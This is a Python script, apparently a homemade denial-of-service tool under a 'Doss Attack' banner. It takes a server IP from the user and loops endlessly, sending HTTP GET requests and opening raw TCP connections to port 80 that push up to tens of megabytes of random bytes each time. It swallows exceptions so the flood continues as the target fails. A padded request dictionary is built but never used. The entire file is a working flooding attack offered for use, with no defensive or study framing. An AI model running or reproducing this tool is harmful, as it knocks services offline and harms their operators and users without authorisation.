import socket
import requests
import random
import time
import sys
#import pyfiglet
import os
RR="\033[0;101m"
GG="\033[0;102m"
GR="\033[40m\033[1;30m"
W  = '\33[0m'
R  = '\33[1;31m'
G  = '\033[1;32m'
O  = '\33[1;33m'
B  = '\33[1;34m'
P  = '\33[1;35m'
C  = '\33[1;36m'
GR = '\33[1;37m'
def dicts():
	pw="QWERTYUIOPASDFGHJKLZXCVBNM"
	dump=''.join(random.choice(pw)for i in range(11))
	return dump
def myattack(host,port,vv):
	vv=str(vv)
	
	url='http://'+host+'/'
	rr=requests.get(url)
	header=rr.headers
	payload={
	"user":'pws',
	"username":"iso4",
	"password":"hacmtry",
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	dicts():dicts(),
	
	
	}
	req=requests.get(url)
	status=req.status_code
	print(R+f'Connection {P}[ {url} ]{R}status:'+G+str(status))
	list=[6,4,5,7,8]
	pw=random.choice(list)
	num="12345678"
	fin=''.join(random.choice(num)for i in range(pw))
	fin=int(fin)
	data=random._urandom(fin)
	server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.connect((host,port))
	server.sendall(data)
	print(R+vv+" send data packet "+P+str(fin)+R+" to searver : "+G+url)
	
	
	
	
	
def starts():
#	aa=pyfiglet.figlet_format('Doss Attack')
	print(R+"""
 ____                     _   _   _             _
|  _ \  ___  ___ ___     / \ | |_| |_ __ _  ___| | __
| | | |/ _ \/ __/ __|   / _ \| __| __/ _` |/ __| |/ /
| |_| | (_) \__ \__ \  / ___ \ |_| || (_| | (__|   <
|____/ \___/|___/___/ /_/   \_\__|\__\__,_|\___|_|\_\

""")
#	print(R+aa)
	host=input(G+'Please Enter server ip : ').strip()
	#	port=int(G+'Please Enter server port(ex80) : )
	vv=0
	if host=="":
		print(R+"Error Please Enter host ip address ! ")
		time.sleep(1)
		os.system('clear')
		starts()
	while True:
		try:
			vv+=1
			myattack(host,80,vv)
		except:
			print(RR+"Server dump !!! "+W+host)
			continue
	
starts()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
